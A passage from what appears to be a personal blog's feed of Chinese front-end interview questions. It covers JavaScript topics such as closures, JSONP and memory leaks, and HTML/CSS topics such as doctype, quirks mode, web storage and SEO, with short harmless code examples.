class="line">  this.age = 19;</span><br><span class="line">  this.action = function () &#123;</span><br><span class="line">    alert(&apos;吃饭&apos;);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(b)、使用 prototype 关键字，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function obj ()&#123;&#125;</span><br><span class="line">obj.prototype.name =&apos;张三&apos;;</span><br><span class="line">obj.prototype.action = function ()&#123;</span><br><span class="line">  alert(&apos;吃饭&apos;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>4)、通过Window创建对象，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">window.name = &apos;张三&apos;;</span><br><span class="line">window.age = 19;</span><br><span class="line">window.action = function() &#123;</span><br><span class="line"> alert(&apos;吃饭&apos;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>5)、使用内置对象创建对象。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var str = new String(&quot;实例初始化String&quot;);</span><br><span class="line">var str1 = &quot;直接赋值的String&quot;;</span><br><span class="line">var func = new Function(&quot;x&quot;,&quot;alert(x)&quot;);//示例初始化func</span><br><span class="line">var obj = new Object();//示例初始化一个Object</span><br></pre></td></tr></table></figure><h2 id="31、iframe的优缺点？"><a href="#31、iframe的优缺点？" class="headerlink" title="31、iframe的优缺点？"></a>31、iframe的优缺点？</h2><p>优点：</p><blockquote><p>解决加载缓慢的第三方内容如图标和广告等的加载问题<br>Security sandbox<br>并行加载脚本</p></blockquote><p>缺点：</p><blockquote><p>iframe会阻塞主页面的Onload事件<br>即时内容为空，加载也需要时间<br>没有语意</p></blockquote><h2 id="32、Cookie-缺点："><a href="#32、Cookie-缺点：" class="headerlink" title="32、Cookie 缺点："></a>32、Cookie 缺点：</h2><blockquote><p>Cookie数量和长度的限制。每个domain最多只能有20条cookie，每个cookie长度不能超过4KB，否则会被截掉。<br>安全性问题。如果cookie被人拦截了，那人就可以取得所有的session信息。即使加密也与事无补，因为拦截者并不需要知道cookie的意义，他只要原样转发cookie就可以达到目的了。<br>有些状态不可能保存在客户端。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。</p></blockquote><h2 id="33、js延迟加载的方式有哪些"><a href="#33、js延迟加载的方式有哪些" class="headerlink" title="33、js延迟加载的方式有哪些"></a>33、js延迟加载的方式有哪些</h2><blockquote><p>defer和async<br>动态创建DOM方式（创建script，插入到DOM中，加载完毕后callBack）<br>按需异步载入js</p></blockquote><h2 id="34、documen-write-和-innerHTML-的区别"><a href="#34、documen-write-和-innerHTML-的区别" class="headerlink" title="34、documen.write 和 innerHTML 的区别"></a>34、documen.write 和 innerHTML 的区别</h2><blockquote><p>document.write 只能重绘整个页面<br>innerHTML 可以重绘页面的一部分</p></blockquote><h2 id="35、哪些操作会造成内存泄漏"><a href="#35、哪些操作会造成内存泄漏" class="headerlink" title="35、哪些操作会造成内存泄漏"></a>35、哪些操作会造成内存泄漏</h2><blockquote><p>内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。<br>垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。<br>如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。</p></blockquote><ul><li>setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。</li><li>闭包</li><li>控制台日志</li><li>循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）</li></ul><h2 id="36、事件委托是什么"><a href="#36、事件委托是什么" class="headerlink" title="36、事件委托是什么"></a>36、事件委托是什么</h2><blockquote><p>利用事件冒泡的原理，让自己的所触发的事件，让其父元素代替执行！</p></blockquote><h2 id="37、闭包是什么，有什么特性，对页面有什么影响"><a href="#37、闭包是什么，有什么特性，对页面有什么影响" class="headerlink" title="37、闭包是什么，有什么特性，对页面有什么影响"></a>37、闭包是什么，有什么特性，对页面有什么影响</h2><blockquote><p>闭包就是能够读取其他函数内部变量的函数。<br>在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function outer()&#123;</span><br><span class="line">  var num = 1;</span><br><span class="line">  function inner()&#123;</span><br><span class="line">    var n = 2;</span><br><span class="line">    alert(n + num);</span><br><span class="line">  &#125;</span><br><span class="line">  return inner;</span><br><span class="line">&#125;</span><br><span class="line">outer()();</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/gaoshanwudi/article/details/7355794" target="_blank" rel="noopener">闭包资料</a></p><h2 id="38、解释-jsonp-的原理，以及为什么不是真正的-ajax"><a href="#38、解释-jsonp-的原理，以及为什么不是真正的-ajax" class="headerlink" title="38、解释 jsonp 的原理，以及为什么不是真正的 ajax"></a>38、解释 jsonp 的原理，以及为什么不是真正的 ajax</h2><blockquote><p>动态创建script标签，回调函数<br>Ajax是页面无刷新请求数据操作</p></blockquote><h2 id="39、-字符串反转，如将-‘12345678’-变成-‘87654321’"><a href="#39、-字符串反转，如将-‘12345678’-变成-‘87654321’" class="headerlink" title="39、 字符串反转，如将 ‘12345678’ 变成 ‘87654321’"></a>39、 字符串反转，如将 ‘12345678’ 变成 ‘87654321’</h2><p>思路：先将字符串转换为数组 split()，利用数组的反序函数 reverse()颠倒数组，再利用 jion() 转换为字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var str = &apos;12345678&apos;;</span><br><span class="line">str = str.split(&apos;&apos;).reverse().join(&apos;&apos;);</span><br></pre></td></tr></table></figure><h2 id="40、将数字-12345678-转化成-RMB-形式-如：-12-345-678"><a href="#40、将数字-12345678-转化成-RMB-形式-如：-12-345-678" class="headerlink" title="40、将数字 12345678 转化成 RMB 形式 如： 12,345,678"></a>40、将数字 12345678 转化成 RMB 形式 如： 12,345,678</h2><p>思路：先将数字转为字符， str= str + ‘’ ;<br>利用反转函数，每三位字符加一个 ‘,’最后一位不加； re()是自定义的反转函数，最后再反转回去！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function re(str) &#123;</span><br><span class="line">  str += &apos;&apos;;</span><br><span class="line">  return str.split(&quot;&quot;).reverse().join(&quot;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">function toRMB(num) &#123;</span><br><span class="line">  var tmp=&apos;&apos;;</span><br><span class="line">  for (var i = 1; i &lt;= re(num).length; i++) &#123;    </span><br><span class="line">    tmp += re(num)[i - 1];    </span><br><span class="line">    if (i % 3 == 0 &amp;&amp; i != re(num).length) &#123;        </span><br><span class="line">      tmp += &apos;,&apos;;    </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return re(tmp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="41、window-location-search-返回的是什么？"><a href="#41、window-location-search-返回的是什么？" class="headerlink" title="41、window.location.search() 返回的是什么？"></a>41、window.location.search() 返回的是什么？</h2><blockquote><p>查询(参数)部分。<br>除了给动态语言赋值以外，我们同样可以给静态页面,并使用 javascript 来获得相信应的参数值<br>返回值：?ver=1.0&amp;id=timlq 也就是问号后面的！</p></blockquote><h2 id="42、window-location-hash-返回的是什么？"><a href="#42、window-location-hash-返回的是什么？" class="headerlink" title="42、window.location.hash 返回的是什么？"></a>42、window.location.hash 返回的是什么？</h2><blockquote><p>锚点 返回值：#love</p></blockquote><h2 id="43、window-location-reload-作用？"><a href="#43、window-location-reload-作用？" class="headerlink" title="43、window.location.reload() 作用？"></a>43、window.location.reload() 作用？</h2><blockquote><p>刷新当前页面</p></blockquote><h2 id="44、Javascript-中的垃圾回收机制？"><a href="#44、Javascript-中的垃圾回收机制？" class="headerlink" title="44、Javascript 中的垃圾回收机制？"></a>44、Javascript 中的垃圾回收机制？</h2><blockquote><p>在Javascript中，如果一个对象不再被引用，那么这个对象就会被GC回收。如果两个对象互相引用，而不再 被第3者所引用，那么这两个互相引用的对象也会被回收。因为函数a被b引用，b又被a外的c引用，这就是为什么 函数a执行后不会被回收的原因。</p></blockquote><h2 id="45、为什么不能定义-1px-左右的-div-容器"><a href="#45、为什么不能定义-1px-左右的-div-容器" class="headerlink" title="45、为什么不能定义 1px 左右的 div 容器"></a>45、为什么不能定义 1px 左右的 div 容器</h2><p>IE6下这个问题是因为默认的行高造成的，解决的方法也有很多，例如：</p><p><code>overflow:hidden</code> | <code>zoom:0.08</code>| <code>line-height:1px</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1、javascript-的-typeof-返回哪些数据类型&quot;&gt;&lt;a href=&quot;#1、javascript-的-typeof-返回哪些数据类型&quot; class=&quot;headerlink&quot; title=&quot;1、javascript 的 typeof 返回哪些数据类型&quot;&gt;&lt;/a&gt;1、javascript 的 typeof 返回哪些数据类型&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;alert(&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;]); &lt;span class=&quot;comment&quot;&gt;//&#39;object&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alert(&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;leipeng&#39;&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;//&#39;string&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alert(&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; i); &lt;span class=&quot;comment&quot;&gt;//&#39;boolean&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alert(&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;//&#39;number&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; a; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alert(&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; a); &lt;span class=&quot;comment&quot;&gt;//&#39;undefined&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;a&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alert(&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; a) &lt;span class=&quot;comment&quot;&gt;//&#39;function&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;2、-3-种强制类型转换和-2-种隐式类型转换&quot;&gt;&lt;a href=&quot;#2、-3-种强制类型转换和-2-种隐式类型转换&quot; class=&quot;headerlink&quot; title=&quot;2、 3 种强制类型转换和 2 种隐式类型转换&quot;&gt;&lt;/a&gt;2、 3 种强制类型转换和 2 种隐式类型转换&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;强制（parseInt(),parseFloat(),Number()）&lt;br&gt;隐式（== ,!!）&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="题库系列" scheme="http://yoursite.com/categories/%E9%A2%98%E5%BA%93%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>题库-HTML、CSS篇</title>
    <link href="http://yoursite.com/2016/04/08/%E9%A2%98%E5%BA%93-HTML%E3%80%81CSS%E7%AF%87/"/>
    <id>http://yoursite.com/2016/04/08/题库-HTML、CSS篇/</id>
    <published>2016-04-07T16:00:00.000Z</published>
    <updated>2018-06-04T08:15:36.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、浏览器的内核"><a href="#1、浏览器的内核" class="headerlink" title="1、浏览器的内核"></a>1、浏览器的内核</h2><blockquote><p>IE: trident内核<br>Firefox：gecko内核<br>Safari:webkit内核<br>Opera:以前是presto内核，Opera现已改用Google Chrome的Blink内核<br>Chrome:Blink(基于webkit，Google与Opera Software共同开发)</p></blockquote><h2 id="2、Doctype"><a href="#2、Doctype" class="headerlink" title="2、Doctype"></a>2、Doctype</h2><blockquote><p><code>&lt;!DOCTYPE&gt;</code> 声明位于文档中的最前面的位置，处于 标签之前。<br>此标签可告知浏览器文档使用哪种 HTML 或 XHTML 规范。<br>重点：告知浏览器该以何种模式来渲染文档<br>DOCTYPE不存在或格式不正确会导致文档以混杂模式呈现。</p></blockquote><a id="more"></a><h2 id="3、Quirks-模式和-Standards-模式区别"><a href="#3、Quirks-模式和-Standards-模式区别" class="headerlink" title="3、Quirks 模式和 Standards 模式区别"></a>3、Quirks 模式和 Standards 模式区别</h2><blockquote><p>从IE6开始，引入了Standards模式，标准模式中，浏览器尝试给符合标准的文档在规范上的正确处理达到在指定浏览器中的程度；<br>在IE6之前CSS还不够成熟，所以IE5等之前的浏览器对CSS的支持很差， IE6将对CSS提供更好的支持，然而这时的问题就来了；<br>因为有很多页面是基于旧的布局方式写的，而如果IE6 支持CSS则将令这些页面显示不正常，如何在即保证不破坏现有页面，又提供新的渲染机制呢；<br>在写程序时我们也会经常遇到这样的问题，如何保证原来的接口不变，又提供更强大的功能，尤其是新功能不兼容旧功能时；<br>遇到这种问题时的一个常见做法是增加参数和分支，即当某个参数为真时，我们就使用新功能，而如果这个参数 不为真时，就使用旧功能，这样就能不破坏原有的程序，又提供新功能；<br>IE6也是类似这样做的，它将DTD当成了这个“参数”，因为以前的页面大家都不会去写DTD，所以IE6就假定如果写了DTD，就意味着这个页面将采用对CSS支持更好的布局，而如果没有，则采用兼容之前的布局方式；<br>这就是Quirks模式（怪癖模式，诡异模式，怪异模式）。</p></blockquote><p><strong>区别：</strong></p><p>总体会有布局、样式解析和脚本执行三个方面的区别。</p><p>盒模型：</p><ul><li>在W3C标准中，如果设置一个元素的宽度和高度，指的是元素内容的宽度和高度，</li><li>在 Quirks 模式下，IE的宽度和高度还包含了 padding 和 border。</li></ul><p>设置行内元素的高宽：</p><ul><li>在 Standards 模式下，给等行内元素设置 wdith 和 height 都不会生效，</li><li>在 quirks 模式下，则会生效。</li></ul><p>设置百分比的高度：</p><ul><li>在standards模式下，一个元素的高度是由其包含的内容来决定的，如果父元素没有设置百分比的高度，子元素设置一个百分比的高度是无效的用 margin:0 auto 设置水平居中：</li><li>使用 margin:0 auto 在 standards 模式下可以使元素水平居中，但在quirks模式下却会失效。</li></ul><h2 id="4、div-css的布局较table布局的优点"><a href="#4、div-css的布局较table布局的优点" class="headerlink" title="4、div+css的布局较table布局的优点"></a>4、div+css的布局较table布局的优点</h2><blockquote><p>改版的时候更方便，只要改css文件。<br>页面加载速度更快、结构化清晰、页面显示简洁。<br>表现与结构相分离。<br>易于优化（seo）搜索引擎更友好，排名更容易靠前。</p></blockquote><h2 id="5、img-的-alt-与-title-异同"><a href="#5、img-的-alt-与-title-异同" class="headerlink" title="5、img 的 alt 与 title 异同"></a>5、img 的 alt 与 title 异同</h2><blockquote><p>a:alt(alt text):为不能显示图像、窗体或applets的用户代理（UA），alt属性用来指定替换文字；<br>替换文字的语言由 lang 属性指定。在IE浏览器下会在没有 title 时把 alt 当成 tool tip 显示；<br>title(tool tip):该属性为设置该属性的元素提供建议性的信息。</p></blockquote><h2 id="6、strong-与-em-的异同"><a href="#6、strong-与-em-的异同" class="headerlink" title="6、strong 与 em 的异同"></a>6、strong 与 em 的异同</h2><blockquote><p>strong: 粗体强调标签，强调，表示内容的重要性<br>em: 斜体强调标签，更强烈强调，表示内容的强调点</p></blockquote><h2 id="7、渐进增强、优雅降级"><a href="#7、渐进增强、优雅降级" class="headerlink" title="7、渐进增强、优雅降级"></a>7、渐进增强、优雅降级</h2><p>渐进增强 progressive enhancement：</p><blockquote><p>针对低版本浏览器进行构建页面，保证最基本的功能，然后再针对高级浏览器进行效果、交互等改进和追加功能达到更好的用户体验。</p></blockquote><p>优雅降级 graceful degradation：</p><blockquote><p>一开始就构建完整的功能，然后再针对低版本浏览器进行兼容。</p></blockquote><p>区别：</p><blockquote><p>优雅降级是从复杂的现状开始，并试图减少用户体验的供给；<br>渐进增强则是从一个非常基础的，能够起作用的版本开始，并不断扩充，以适应未来环境的需要。<br>降级（功能衰减）意味着往回看；而渐进增强则意味着朝前看，同时保证其根基处于安全地带。</p></blockquote><p>“优雅降级”观点</p><p> “优雅降级”观点认为应该针对那些最高级、最完善的浏览器来设计网站。而将那些被认为“过时”或有功能缺失的浏览器下的测试工作安排在开发周期的最后阶段，并把测试对象限定为主流浏览器（如 IE、Mozilla 等）的前一个版本。在这种设计范例下，旧版的浏览器被认为仅能提供“简陋却无妨 (poor, but passable)” 的浏览体验。你可以做一些小的调整来适应某个特定的浏览器。但由于它们并非我们所关注的焦点，因此除了修复较大的错误之外，其它的差异将被直接忽略。</p><p>“渐进增强”观点则认为应关注于内容本身。内容是我们建立网站的诱因。有的网站展示它，有的则收集它，有的寻求，有的操作，还有的网站甚至会包含以上的种种，但相同点是它们全都涉及到内容。这使得“渐进增强”成为一种更为合理的设计范例。这也是它立即被 Yahoo! 所采纳并用以构建其“分级式浏览器支持 (Graded Browser Support)”策略的原因所在。</p><p>IE6,7,8网页效果相对高版本现代浏览器少了很多圆角，阴影（CSS3），要求兼容（使用图片背景，放弃CSS3），如何解决？</p><h2 id="8、为什么利用多个域名来存储网站资源会更有效"><a href="#8、为什么利用多个域名来存储网站资源会更有效" class="headerlink" title="8、为什么利用多个域名来存储网站资源会更有效"></a>8、为什么利用多个域名来存储网站资源会更有效</h2><blockquote><p>CDN缓存更方便<br>突破浏览器并发限制<br>节约cookie带宽<br>节约主域名的连接数，优化页面响应速度<br>防止不必要的安全问题</p></blockquote><h2 id="9、对网页标准和标准制定机构重要性"><a href="#9、对网页标准和标准制定机构重要性" class="headerlink" title="9、对网页标准和标准制定机构重要性"></a>9、对网页标准和标准制定机构重要性</h2><blockquote><p>网页标准和标准制定机构都是为了能让web发展的更‘健康’，<br>开发者遵循统一的标准，降低开发难度，开发成本，SEO也会更好做，也不会因为滥用代码导致各种BUG、安全问题，最终提高网站易用性。</p></blockquote><h2 id="10、cookies，sessionStorage-和-localStorage-的区别"><a href="#10、cookies，sessionStorage-和-localStorage-的区别" class="headerlink" title="10、cookies，sessionStorage 和 localStorage 的区别"></a>10、cookies，sessionStorage 和 localStorage 的区别</h2><p>sessionStorage 用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。</p><p>因此 sessionStorage 不是一种持久化的本地存储，仅仅是会话级别的存储。而 localStorage 用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。</p><p>web storage 和 cookie 的区别</p><blockquote><p>Web Storage 的概念和 cookie 相似，区别是它是为了更大容量存储设计的;<br>Cookie的大小是受限的，并且每次你请求一个新的页面的时候 Cookie 都会被发送过去，这样无形中浪费了带宽;<br>cookie 还需要指定作用域，不可以跨域调用;<br>Web Storage 拥有 setItem, getItem, removeItem, clear等方法，<br>cookie 需要前端开发者自己封装 setCookie，getCookie。<br>Cookie 是不可以或缺的：Cookie 的作用是与服务器进行交互，作为 HTTP 规范的一部分而存在;<br>Web Storage 仅仅是为了在本地“存储”数据而生。</p></blockquote><h2 id="11、简述一下-src-与-href-的区别"><a href="#11、简述一下-src-与-href-的区别" class="headerlink" title="11、简述一下 src 与 href 的区别"></a>11、简述一下 src 与 href 的区别</h2><blockquote><p>src 用于替换当前元素，href 用于在当前文档和引用资源之间确立联系。<br>src 是 source 的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；<br>在请求 src 资源时会将其指向的资源下载并应用到文档内，例如 js 脚本，img 图片和 frame 等元素，<code>&lt;script src =”js.js”&gt;&lt;/script&gt;。</code></p></blockquote><p>当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架等元素也如此，类似于将所指向资源嵌入当前标签内。<strong>这也是为什么将js脚本放在底部而不是头部</strong>。</p><p>href 是 Hypertext Reference 的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接，如果我们在文档中添加<code>&lt;link href=”common.css” rel=”stylesheet”/&gt;</code>，那么浏览器会识别该文档为 css 文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用 link 方式来加载 css ，而不是使用 @import 方式。</p><h2 id="12、网页制作会用到的图片格式"><a href="#12、网页制作会用到的图片格式" class="headerlink" title="12、网页制作会用到的图片格式"></a>12、网页制作会用到的图片格式</h2><p>png-8，png-24，jpeg，gif，svg。</p><blockquote><p>Webp：WebP 格式，谷歌（google）开发的一种旨在加快图片加载速度的图片格式。<br>图片压缩体积大约只有 JPEG 的 2/3，并能节省大量的服务器带宽资源和数据空间。<br>Facebook Ebay 等知名网站已经开始测试并使用WebP格式。<br>在质量相同的情况下，WebP 格式图像的体积要比 JPEG 格式图像小 40%</p></blockquote><h2 id="13、什么是微格式及其在前端构建中微格式的考虑"><a href="#13、什么是微格式及其在前端构建中微格式的考虑" class="headerlink" title="13、什么是微格式及其在前端构建中微格式的考虑"></a>13、什么是微格式及其在前端构建中微格式的考虑</h2><blockquote><p>微格式（Microformats）是一种让机器可读的语义化 XHTML 词汇的集合，是结构化数据的开放标准。<br>是为特殊应用而制定的特殊格式。<br>优点：将智能数据添加到网页上，让网站内容在搜索引擎结果界面可以显示额外的提示。<br>应用范例：豆瓣</p></blockquote><h2 id="14、在-css-js-代码上线之后开发人员经常会优化性能，从用户刷新网页开始，一次-js-请求一般情况下有哪些地方会有缓存处理"><a href="#14、在-css-js-代码上线之后开发人员经常会优化性能，从用户刷新网页开始，一次-js-请求一般情况下有哪些地方会有缓存处理" class="headerlink" title="14、在 css/js 代码上线之后开发人员经常会优化性能，从用户刷新网页开始，一次 js 请求一般情况下有哪些地方会有缓存处理"></a>14、在 css/js 代码上线之后开发人员经常会优化性能，从用户刷新网页开始，一次 js 请求一般情况下有哪些地方会有缓存处理</h2><blockquote><p>dns缓存<br>cdn缓存<br>浏览器缓存<br>服务器缓存</p></blockquote><h2 id="15、加载海量图片"><a href="#15、加载海量图片" class="headerlink" title="15、加载海量图片"></a>15、加载海量图片</h2><blockquote><p>图片懒加载，在页面上的未可视区域可以添加一个滚动条事件，判断图片位置与浏览器顶端的距离与页面的距离，如果前者小于后者，优先加载。<br>如果为幻灯片、相册等，可以使用图片预加载技术，将当前展示图片的前一张和后一张优先下载。<br>如果图片为 css 图片，可以使用 CSSsprite，SVGsprite，Iconfont、Base64 等技术。<br>如果图片过大，可以使用特殊编码的图片，加载时会先加载一张压缩的特别厉害的缩略图，以提高用户体验。<br>如果图片展示区域小于图片的真实大小，则因在服务器端根据业务需要先行进行图片压缩，图片压缩后大小与展示一致。</p></blockquote><h2 id="16、HTML结构的语义化"><a href="#16、HTML结构的语义化" class="headerlink" title="16、HTML结构的语义化　"></a>16、HTML结构的语义化　</h2><blockquote><p>去掉或样式丢失的时候能让页面呈现清晰的结构.</p></blockquote><p>html本身是没有表现的，我们看到例如<code>&lt;h1&gt;</code>是粗体，字体大小 2em，加粗；<br><code>&lt;strong&gt;</code>是加粗的，不要认为这是 html 的表现，这些其实 html 默认的 css 样式在起作用.<br>所以去掉或样式丢失的时候能让页面呈现清晰的结构不是语义化的 HTML 结构的优点.<br>但是浏览器都有有默认样式，默认样式的目的也是为了更好的表达 html 的语义.<br>可以说浏览器的默认样式和语义化的 HTML 结构是不可分割的.<br>屏幕阅读器（如果访客有视障）会完全根据标记来“读”你的网页.<br>例如,如果你使用的含语义的标记,屏幕阅读器就会“逐个拼出”你的单词,而不是试着去对它完整发音.<br>PDA、手机等设备可能无法像普通电脑的浏览器一样来渲染网页（通常是因为这些设备对CSS的支持较弱）</p><blockquote><p>使用语义标记可以确保这些设备以一种有意义的方式来渲染网页.</p></blockquote><p>理想情况下,观看设备的任务是符合设备本身的条件来渲染网页.<br>语义标记为设备提供了所需的相关信息,就省去了你自己去考虑所有可能的显示情况（包括现有的或者将来新的设备）.<br>例如,一部手机可以选择使一段标记了标题的文字以粗体显示.而掌上电脑可能会以比较大的字体来显示.<br>无论哪种方式一旦你对文本标记为标题,您就可以确信读取设备将根据其自身的条件来合适地显示页面.</p><blockquote><p>搜索引擎的爬虫也依赖于标记来确定上下文和各个关键字的权重</p></blockquote><p>过去你可能还没有考虑搜索引擎的爬虫也是网站的“访客”,但现在它们他们实际上是极其宝贵的用户.<br>没有他们的话,搜索引擎将无法索引你的网站,然后一般用户将很难过来访问.<br>你的页面是否对爬虫容易理解非常重要,因为爬虫很大程度上会忽略用于表现的标记,而只注重语义标记.<br>如果页面文件的标题被标记,那么这个页面在搜索结果的位置可能会比较靠后.</p><blockquote><p>除了提升易用性外,语义标记有利于正确使用CSS和JavaScript.</p></blockquote><p>因为其本身提供了许多“钩钩”来应用页面的样式与行为.<br>SEO主要还是靠你网站的内容和外部链接的。</p><blockquote><p>便于团队开发和维护</p></blockquote><p>W3C 给我们定了一个很好的标准，在团队中大家都遵循这个标准，可以减少很多差异化的东西，方便开发和维护，提高开发效率，甚至实现模块化开发。</p><h2 id="17、以前端角度出发做好SEO需要考虑什么"><a href="#17、以前端角度出发做好SEO需要考虑什么" class="headerlink" title="17、以前端角度出发做好SEO需要考虑什么"></a>17、以前端角度出发做好SEO需要考虑什么</h2><blockquote><p>了解搜索引擎如何抓取网页和如何索引网页</p></blockquote><p>你需要知道一些搜索引擎的基本工作原理，各个搜索引擎之间的区别，搜索机器人（SE robot 或叫 web crawler）如何进行工作，搜索引擎如何对搜索结果进行排序等等。</p><blockquote><p>Meta标签优化</p></blockquote><p>主要包括主题（Title)，网站描述(Description)，和关键词（Keywords）。<br>还有一些其它的隐藏文字比如Author（作者），Category（目录），Language（编码语种）等。</p><blockquote><p>如何选取关键词并在网页中放置关键词</p></blockquote><ul><li>搜索就得用关键词。<ul><li>关键词分析和选择是SEO最重要的工作之一。</li></ul></li><li>首先要给网站确定主关键词（一般在5个上下）<ul><li>针对这些关键词进行优化<ul><li>关键词密度（Density）</li><li>相关度（Relavancy）</li><li>突出性（Prominency）等</li></ul></li></ul></li></ul><blockquote><p>了解主要的搜索引擎</p></blockquote><p>虽然搜索引擎有很多，但是对网站流量起决定作用的就那么几个。<br>比如英文的主要有Google，Yahoo，Bing等；中文的有百度，搜狗，有道等。<br>不同的搜索引擎对页面的抓取和索引、排序的规则都不一样。<br>还要了解各搜索门户和搜索引擎之间的关系，比如AOL网页搜索用的是Google的搜索技术，MSN用的是Bing的技术。</p><blockquote><p>主要的互联网目录</p></blockquote><p>Open 